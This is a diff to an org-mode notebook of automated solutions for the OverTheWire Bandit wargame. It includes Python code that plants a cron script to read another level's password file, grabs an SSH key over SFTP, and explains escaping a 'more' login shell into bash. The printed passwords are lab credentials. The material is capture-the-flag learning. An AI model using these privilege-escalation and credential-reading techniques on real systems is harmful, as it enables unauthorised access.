@@ -59,6 +59,7 @@ def connect(username: str):
 def make_work_dir():
     path = '/tmp/jaydlc'
     ssh.exec_command(F'mkdir {path} && chmod 777 {path}')
+    return path
 #+end_src
 
 * Bandit0 => Bandit1
@@ -500,7 +501,7 @@ bandit17()
 
 * Bandit18 => Bandit19
 
-Trying to log in with the normal =ssh= command will kick us out but with paramiko it's pretty simple
+Trying to log in with the normal =ssh= command will kick us out but with paramiko it's pretty simple.
 #+begin_src python :tangle ape.py :session :results silent
 def bandit18():
     print("Pwning bandit18")
@@ -509,6 +510,8 @@ def bandit18():
     credentials['bandit19'] = out.readline().strip()
     save()
 #+end_src
+
+The normal way would be to use the command: =ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"=
 
 #+begin_src python :session :exports none
 bandit18()
@@ -691,11 +694,12 @@ Now we need to create our own script to be executed by the cronjob.
 We'll just use a simple script to read the password file and put it in a temp file that we can read
 
 #+begin_src python :tangle ape.py :session :results silent
-def bandit23():
+def bandit23(show_progress=True):
     print("Pwning bandit23")
     connect('bandit23')
-    script = b"""cat /etc/bandit_pass/bandit24 > /tmp/jaydlc
-    chmod +rw /tmp/jaydlc"""
+    path = make_work_dir() + "/24"
+    script = f"""cat /etc/bandit_pass/bandit24 > {path}
+    chmod +rw {path}""".encode()
     encoded = base64.b64encode(script).decode()
     script_path = '/var/spool/bandit24/jaydlc.sh'
     print("Sending over script to run")
@@ -703,26 +707,28 @@ def bandit23():
     ssh.exec_command(command)
     print("Waiting for one minute before reading password file")
     sleep_seconds = 60
-    _, out, _ = ssh.exec_command(f'sleep {sleep_seconds} && cat /tmp/jaydlc')
+    _, out, _ = ssh.exec_command(f'sleep {sleep_seconds} && cat {path}')
     for remaining in range(sleep_seconds, 0, -1):
-        sys.stdout.write('\r')
-        sys.stdout.write('{:2d} seconds remaining'.format(remaining))
-        sys.stdout.flush()
-        time.sleep(1)
+        if show_progress:
+            sys.stdout.write('\r')
+            sys.stdout.write('{:2d} seconds remaining'.format(remaining))
+            sys.stdout.flush()
+            time.sleep(1)
 
     passwd = out.readline().strip()
-    sys.stdout.write('\rRetrieved password! Password is ' + passwd)
+    if show_progress:
+        sys.stdout.write('\rRetrieved password! Password is ' + passwd)
     credentials['bandit24'] = passwd
     save()
 #+end_src
 
 #+begin_src python :session :exports none
 bandit23()
-credentials['bandit23']
+credentials['bandit24']
 #+end_src
 
 #+RESULTS:
-: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 * Bandit24 => Bandit25
 #+begin_src python :tangle ape.py :session :results silent
@@ -773,3 +779,43 @@ credentials['bandit25']
 
 #+RESULTS:
 : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+* Bandit25 => Bandit26
+#+begin_src python :tangle ape.py :session :results silent
+def bandit25():
+    print("Pwning bandit25")
+    connect('bandit25')
+
+    root = os.getcwd()
+    cwd = 'working/bandit25'
+    try:
+        shutil.rmtree(cwd)
+    except:
+        pass
+
+    os.mkdir(cwd)
+    os.chdir(cwd)
+
+    sftp = ssh.open_sftp()
+    sftp.get('./bandit26.sshkey', './bandit26_id_rsa')
+    sftp.close()
+
+    credentials["bandit26"] = [os.getcwd() + '/bandit26_id_rsa']
+
+    os.chdir(root)
+    save()
+#+end_src
+
+* Bandit26 => Bandit27
+
+Unfortunately, after getting the ssh key for bandit26, I have not figured out a way to automate the pwning of 27 due to bandit26's login shell being =more=.
+The manual way to do it is to make your terminal really small so that =more= enters command mode.
+In command mode, press =v= to open vi, enter =:set shell=/bin/bash= to override the shell environment variable, and then enter =:shell=.
+After the bash shell has spawned, enter the command =./bandit27-do cat /etc/bandit_pass/bandit27= and you should get the password for bandit27.
+#+begin_src python :session :exports none
+credentials['bandit27'] = '3ba3118a22e93127a4ed485be72ef5ea'
+credentials['bandit27']
+#+end_src
+
+#+RESULTS:
+: 3ba3118a22e93127a4ed485be72ef5ea
